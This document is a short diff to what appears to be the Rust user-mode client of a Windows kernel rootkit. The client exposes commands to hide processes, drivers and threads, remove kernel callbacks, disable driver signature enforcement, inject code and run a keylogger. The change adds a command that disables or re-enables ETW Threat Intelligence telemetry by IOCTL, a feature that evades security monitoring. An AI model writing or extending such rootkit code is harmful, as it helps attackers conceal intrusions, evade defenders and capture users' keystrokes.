@@ -9,17 +9,17 @@ use {
     env_logger::Builder,
 };
 use modules::{
-    callback::{enumerate_callback, remove_callback, restore_callback}, 
-    driver::{enumerate_driver, unhide_hide_driver}, 
-    injection::{injection_apc, injection_thread}, 
-    misc::{dse, keylogger}, 
+    misc::{dse, etwti, keylogger},
     module::{enumerate_module, hide_module}, 
+    callback::{enumerate_callback, remove_callback, restore_callback}, 
+    driver::{enumerate_driver, unhide_hide_driver},
+    injection::{injection_apc, injection_thread},
+    thread::{enumerate_thread, hide_unhide_thread}, 
     process::{
         elevate_process, 
         enumerate_process, hide_unhide_process, 
         signature_process, terminate_process
     }, 
-    thread::{enumerate_thread, hide_unhide_thread}
 };
 
 #[cfg(not(feature = "mapper"))]
@@ -161,6 +161,15 @@ fn main() {
                 } else if *stop {
                     info!("Stop Keylogger");
                     keylogger(IOCTL_KEYLOGGER, false);
+                }
+            },
+            MisCommands::Etwti { disable, enable } => {
+                if *enable {
+                    info!("Enable ETWTI");
+                    etwti(IOCTL_ETWTI, true);
+                } else if *disable {
+                    info!("Disable ETWTI");
+                    etwti(IOCTL_ETWTI, false);
                 }
             },
         },
